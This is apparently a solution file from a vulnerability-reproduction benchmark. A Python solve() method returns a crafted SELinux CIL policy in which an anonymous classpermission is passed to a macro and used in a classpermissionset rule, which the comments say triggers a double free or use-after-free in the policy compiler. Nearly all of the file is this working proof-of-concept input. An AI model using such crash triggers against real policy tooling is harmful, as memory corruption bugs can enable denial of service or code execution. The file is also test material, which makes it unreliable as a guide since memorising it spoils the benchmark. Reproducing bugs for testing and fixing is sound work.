class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a CIL policy that passes an anonymous classpermission to a macro
        # which subsequently uses it in a classpermissionset rule.
        # This triggers a double free or use-after-free during AST destruction
        # because the anonymous classpermission is not correctly distinguished
        # from the rule's reference.
        
        poc = (
            "(class c (p))\n"
            "(classorder (c))\n"
            "(sid kernel)\n"
            "(sidorder (kernel))\n"
            "(user u)\n"
            "(role r)\n"
            "(type t)\n"
            "(sensitivity s)\n"
            "(sensitivityorder (s))\n"
            "(category c)\n"
            "(categoryorder (c))\n"
            "(sensitivitycategory s (c))\n"
            "(sidcontext kernel u r t s (s (c)))\n"
            "(macro m ((classpermission n))\n"
            "    (classpermissionset n (c (p)))\n"
            ")\n"
            "(call m ((c (p))))\n"
        )
        return poc.encode("utf-8")
